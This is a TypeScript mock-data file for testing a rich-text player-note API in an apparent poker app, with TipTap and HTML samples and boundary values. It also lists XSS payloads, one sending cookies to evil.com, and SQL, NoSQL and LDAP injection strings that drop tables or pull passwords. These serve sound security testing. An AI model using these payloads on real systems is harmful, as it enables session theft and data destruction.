// Mock data for Player Note API testing
// Created for TASK-0511: リッチテキストメモAPI実装

import {
  PlayerNote,
  TipTapDocument,
  MAX_CONTENT_SIZE,
  generateMockTipTapJSON,
  generateComplexMockTipTapJSON,
  generateMockHTML,
  generateLargeContent,
} from '../../types/playerNote';

// Sample TipTap JSON structures
export const SAMPLE_TIPTAP_DOCUMENTS = {
  EMPTY_DOCUMENT: {
    type: 'doc',
    content: [],
  } as TipTapDocument,

  SIMPLE_PARAGRAPH: {
    type: 'doc',
    content: [
      {
        type: 'paragraph',
        content: [
          {
            type: 'text',
            text: 'Simple paragraph content',
          },
        ],
      },
    ],
  } as TipTapDocument,

  FORMATTED_TEXT: {
    type: 'doc',
    content: [
      {
        type: 'paragraph',
        content: [
          {
            type: 'text',
            text: 'This text has ',
          },
          {
            type: 'text',
            text: 'bold',
            marks: [{ type: 'bold' }],
          },
          {
            type: 'text',
            text: ' and ',
          },
          {
            type: 'text',
            text: 'italic',
            marks: [{ type: 'italic' }],
          },
          {
            type: 'text',
            text: ' formatting.',
          },
        ],
      },
    ],
  } as TipTapDocument,

  WITH_LINK: {
    type: 'doc',
    content: [
      {
        type: 'paragraph',
        content: [
          {
            type: 'text',
            text: 'Check out this ',
          },
          {
            type: 'text',
            text: 'link',
            marks: [
              {
                type: 'link',
                attrs: {
                  href: 'https://example.com',
                  target: '_blank',
                },
              },
            ],
          },
          {
            type: 'text',
            text: ' for more info.',
          },
        ],
      },
    ],
  } as TipTapDocument,

  COMPLEX_STRUCTURE: {
    type: 'doc',
    content: [
      {
        type: 'heading',
        attrs: { level: 1 },
        content: [
          {
            type: 'text',
            text: 'Player Analysis',
          },
        ],
      },
      {
        type: 'paragraph',
        content: [
          {
            type: 'text',
            text: 'This player shows ',
          },
          {
            type: 'text',
            text: 'aggressive',
            marks: [{ type: 'bold' }],
          },
          {
            type: 'text',
            text: ' tendencies.',
          },
        ],
      },
      {
        type: 'bullet_list',
        content: [
          {
            type: 'list_item',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'High VPIP (30%+)',
                  },
                ],
              },
            ],
          },
          {
            type: 'list_item',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Frequent 3-betting',
                  },
                ],
              },
            ],
          },
          {
            type: 'list_item',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Loose post-flop play',
                  },
                ],
              },
            ],
          },
        ],
      },
      {
        type: 'blockquote',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Note: Watch for potential tilt when down more than 2 buy-ins.',
              },
            ],
          },
        ],
      },
    ],
  } as TipTapDocument,

  NESTED_LISTS: {
    type: 'doc',
    content: [
      {
        type: 'ordered_list',
        content: [
          {
            type: 'list_item',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Pre-flop strategy',
                  },
                ],
              },
              {
                type: 'bullet_list',
                content: [
                  {
                    type: 'list_item',
                    content: [
                      {
                        type: 'paragraph',
                        content: [
                          {
                            type: 'text',
                            text: 'Tight range from early position',
                          },
                        ],
                      },
                    ],
                  },
                  {
                    type: 'list_item',
                    content: [
                      {
                        type: 'paragraph',
                        content: [
                          {
                            type: 'text',
                            text: 'Wider range from button',
                          },
                        ],
                      },
                    ],
                  },
                ],
              },
            ],
          },
          {
            type: 'list_item',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Post-flop tendencies',
                  },
                ],
              },
            ],
          },
        ],
      },
    ],
  } as TipTapDocument,

  WITH_CODE: {
    type: 'doc',
    content: [
      {
        type: 'paragraph',
        content: [
          {
            type: 'text',
            text: 'Player ID: ',
          },
          {
            type: 'text',
            text: 'HERO_123',
            marks: [{ type: 'code' }],
          },
        ],
      },
      {
        type: 'code_block',
        attrs: { language: 'json' },
        content: [
          {
            type: 'text',
            text: '{\n  "vpip": 28.5,\n  "pfr": 22.1,\n  "aggression": 3.2\n}',
          },
        ],
      },
    ],
  } as TipTapDocument,
};

// Sample HTML content
export const SAMPLE_HTML_CONTENT = {
  SIMPLE: '<p>Simple HTML paragraph</p>',

  FORMATTED: '<p><strong>Bold text</strong> and <em>italic text</em> with <u>underline</u></p>',

  WITH_LINKS: '<p>Check out <a href="https://example.com" title="Example site">this link</a> for more info</p>',

  LIST_STRUCTURE: `
    <h2>Player Notes</h2>
    <ul>
      <li>Aggressive pre-flop</li>
      <li>Tight post-flop</li>
      <li>Bluffs frequently on river</li>
    </ul>
    <ol>
      <li>First observation</li>
      <li>Second observation</li>
    </ol>
  `,

  BLOCKQUOTE: `
    <blockquote>
      <p>This player tends to overbet when they have a strong hand.</p>
    </blockquote>
  `,

  MIXED_CONTENT: `
    <h1>Player Analysis: John Doe</h1>
    <p>This is a <strong>detailed analysis</strong> of the player's tendencies.</p>
    <h2>Pre-flop</h2>
    <ul>
      <li>VPIP: <strong>32%</strong></li>
      <li>PFR: <strong>28%</strong></li>
      <li>3-Bet: <strong>8.5%</strong></li>
    </ul>
    <h2>Post-flop</h2>
    <p>Shows <em>aggressive</em> tendencies on the flop but becomes more <em>conservative</em> on later streets.</p>
    <blockquote>
      <p><strong>Important:</strong> Watch for tilt signs when down more than 2 buy-ins.</p>
    </blockquote>
  `,
};

// XSS Attack patterns for security testing
export const XSS_ATTACK_PATTERNS = [
  // Basic script injection
  '<script>alert("XSS")</script>',
  '<script src="http://evil.com/xss.js"></script>',
  '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',

  // Event handler injection
  '<img src="x" onerror="alert(\'XSS\')">',
  '<body onload="alert(\'XSS\')">',
  '<input type="text" onfocus="alert(\'XSS\')" autofocus>',
  '<svg onload="alert(\'XSS\')">',
  '<iframe onload="alert(\'XSS\')"></iframe>',
  '<video><source onerror="alert(\'XSS\')">',
  '<audio src="x" onerror="alert(\'XSS\')" autoplay>',

  // JavaScript URLs
  '<a href="javascript:alert(\'XSS\')">Click me</a>',
  '<form action="javascript:alert(\'XSS\')"><input type="submit" value="Submit"></form>',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',

  // Data URL attacks
  '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',
  '<object data="data:text/html,<script>alert(\'XSS\')</script>"></object>',
  '<embed src="data:text/html,<script>alert(\'XSS\')</script>">',

  // CSS-based attacks
  '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
  '<div style="background:url(javascript:alert(\'XSS\'))">',
  '<style>@import"javascript:alert(\'XSS\')";</style>',
  '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',

  // Meta tag attacks
  '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
  '<meta http-equiv="Set-Cookie" content="sessionid=evil">',

  // HTML5 specific
  '<details open ontoggle="alert(\'XSS\')">',
  '<marquee onstart="alert(\'XSS\')">',
  '<keygen onfocus="alert(\'XSS\')" autofocus>',

  // Encoded attacks
  '&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;',
  '%3Cscript%3Ealert(\'XSS\')%3C/script%3E',
  '\u003cscript\u003ealert(\'XSS\')\u003c/script\u003e',

  // Expression-based (IE)
  '<div style="width:expression(alert(\'XSS\'))">',
  '<style>body{behavior:url(#default#userData);}</style>',

  // SVG-based
  '<svg><script>alert(\'XSS\')</script></svg>',
  '<svg onload="alert(\'XSS\')"></svg>',
  '<svg><foreignObject><body onload="alert(\'XSS\')"></foreignObject></svg>',

  // Math ML
  '<math><mi//xlink:href="data:x,<script>alert(\'XSS\')</script>">',

  // Form-based
  '<form><button formaction="javascript:alert(\'XSS\')">Submit</button></form>',
  '<input type="image" formaction="javascript:alert(\'XSS\')">',

  // Comment-based
  '<!--<script>alert(\'XSS\')</script>-->',
  '<!DOCTYPE html><script>alert(\'XSS\')</script>',

  // CDATA-based
  '<![CDATA[<script>alert(\'XSS\')</script>]]>',
];

// SQL Injection patterns for testing
export const SQL_INJECTION_PATTERNS = [
  // Basic injections
  "'; DROP TABLE player_notes; --",
  "' OR '1'='1",
  "' OR 1=1 --",
  "admin'--",
  "admin'/*",

  // Union-based
  "' UNION SELECT username, password FROM users --",
  "' UNION ALL SELECT NULL, NULL, NULL --",

  // Boolean-based
  "' AND (SELECT COUNT(*) FROM users) > 0 --",
  "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --",

  // Time-based
  "'; WAITFOR DELAY '00:00:10' --",
  "' OR SLEEP(10) --",
  "'; SELECT SLEEP(10) --",

  // Error-based
  "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2)) FROM information_schema.tables GROUP BY 2)a) --",

  // Stacked queries
  "'; INSERT INTO users (username, password) VALUES ('hacker', 'password') --",
  "'; UPDATE users SET password='hacked' WHERE username='admin' --",

  // Comment variations
  "admin'/**/OR/**/1=1",
  "admin'%23%0AAND%231=1",

  // NoSQL injection (for MongoDB-like systems)
  "'; return true; var fake='",
  "' || '1'=='1",

  // LDAP injection
  "*)(uid=*))(|(uid=*",
  "admin*",

  // XPath injection
  "' or '1'='1",
  "'] | //user/*[contains(*,'admin')] | ['",
];

// Special characters and encoding test data
export const SPECIAL_CHARACTER_TESTS = [
  {
    name: 'Unicode emojis',
    content: '🎯📝✨🃏♠️♥️♦️♣️🎰🎲🎪🎨🎭🎪',
  },
  {
    name: 'Mathematical symbols',
    content: '∑∏∫∮∯∰∇∂√∛∜∞≤≥≠±×÷∈∉∩∪⊂⊃',
  },
  {
    name: 'Currency symbols',
    content: '$€£¥₹₽₩₪₫₨₱₦₪₵₡₢₣₤₥₦₧₨₩₪₫€₭₮₯₰₱₲₳₴₵₶₷₸₹₺₻₼₽₾₿',
  },
  {
    name: 'Punctuation marks',
    content: '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~',
  },
  {
    name: 'Accented characters',
    content: 'àáâãäåæçèéêëìíîïðñòóôõöøùúûüýþÿ',
  },
  {
    name: 'Control characters',
    content: 'Line1\nLine2\tTabbed\rCarriage\fForm\vVertical\bBackspace',
  },
  {
    name: 'Null and escape sequences',
    content: 'Text\0Null\x1BEscape\x7FDelete',
  },
  {
    name: 'Right-to-left text',
    content: 'English text mixed with עברית and العربية',
  },
  {
    name: 'Zero-width characters',
    content: 'Invisible\u200B\u200C\u200D\uFEFFcharacters',
  },
  {
    name: 'Surrogate pairs',
    content: '𝕿𝖍𝖎𝖘 𝖎𝖘 𝖆 𝖙𝖊𝖘𝖙 𝖔𝖋 𝖘𝖚𝖗𝖗𝖔𝖌𝖆𝖙𝖊 𝖕𝖆𝖎𝖗𝖘',
  },
];

// Large content generators
export function generatePerformanceTestData() {
  return {
    small: generateLargeContent(0.001), // 1KB
    medium: generateLargeContent(0.01), // 10KB
    large: generateLargeContent(1), // 1MB
    xlarge: generateLargeContent(5), // 5MB
    maxSize: generateLargeContent(10), // 10MB (at limit)
    overLimit: generateLargeContent(11), // 11MB (over limit)
  };
}

// Mock player notes with various characteristics
export const MOCK_PLAYER_NOTES: PlayerNote[] = [
  {
    id: 'note-simple-1',
    player_id: 'player-1',
    content: JSON.stringify(SAMPLE_TIPTAP_DOCUMENTS.SIMPLE_PARAGRAPH),
    content_type: 'json',
    content_hash: 'hash-simple-1',
    created_at: '2025-01-01T10:00:00.000Z',
    updated_at: '2025-01-01T10:00:00.000Z',
  },
  {
    id: 'note-html-1',
    player_id: 'player-2',
    content: SAMPLE_HTML_CONTENT.FORMATTED,
    content_type: 'html',
    content_hash: 'hash-html-1',
    created_at: '2025-01-01T11:00:00.000Z',
    updated_at: '2025-01-01T11:30:00.000Z',
  },
  {
    id: 'note-complex-1',
    player_id: 'player-3',
    content: JSON.stringify(SAMPLE_TIPTAP_DOCUMENTS.COMPLEX_STRUCTURE),
    content_type: 'json',
    content_hash: 'hash-complex-1',
    created_at: '2025-01-01T12:00:00.000Z',
    updated_at: '2025-01-01T14:00:00.000Z',
  },
  {
    id: 'note-japanese-1',
    player_id: 'player-jp-1',
    content: generateMockTipTapJSON('田中太郎は積極的なプレイヤーです。ブラフを多用します。'),
    content_type: 'json',
    content_hash: 'hash-japanese-1',
    created_at: '2025-01-02T09:00:00.000Z',
    updated_at: '2025-01-02T09:00:00.000Z',
  },
  {
    id: 'note-empty-1',
    player_id: 'player-4',
    content: JSON.stringify(SAMPLE_TIPTAP_DOCUMENTS.EMPTY_DOCUMENT),
    content_type: 'json',
    content_hash: 'hash-empty-1',
    created_at: '2025-01-03T08:00:00.000Z',
    updated_at: '2025-01-03T08:00:00.000Z',
  },
];

// Error scenarios data
export const ERROR_SCENARIOS = {
  INVALID_PLAYER_IDS: [
    '',
    ' ',
    '\n',
    '\t',
    'a'.repeat(256), // Too long
    null as never,
    undefined as never,
    123 as never,
    {} as never,
    [] as never,
  ],

  INVALID_CONTENT: [
    null as never,
    undefined as never,
    123 as never,
    {} as never,
    [] as never,
  ],

  INVALID_JSON_CONTENT: [
    '{"type":"invalid"}', // Missing doc type
    '{"content":[]}', // Missing type
    '{type:"doc"}', // Invalid JSON syntax
    '{"type":"doc","content":"not-array"}', // Content not array
    '{"type":"doc","content":[{"invalid":"node"}]}', // Invalid node structure
  ],

  MALFORMED_HTML: [
    '<p><strong>Unclosed strong tag',
    '<div><span>Nested but not closed</div>',
    '<script>alert("xss")</script><p>Mixed content</p>',
    '<![CDATA[Invalid CDATA]]>',
    '<<invalid>>double brackets',
  ],
};

// Boundary value test data
export const BOUNDARY_VALUES = {
  CONTENT_SIZES: {
    empty: '',
    singleChar: 'a',
    twoChars: 'ab',
    maxSizeMinusOne: 'x'.repeat(MAX_CONTENT_SIZE - 1),
    maxSize: 'x'.repeat(MAX_CONTENT_SIZE),
    maxSizePlusOne: 'x'.repeat(MAX_CONTENT_SIZE + 1),
  },

  PLAYER_ID_LENGTHS: {
    singleChar: 'a',
    normalLength: 'player-123',
    maxLength: 'a'.repeat(255),
    overMaxLength: 'a'.repeat(256),
  },
};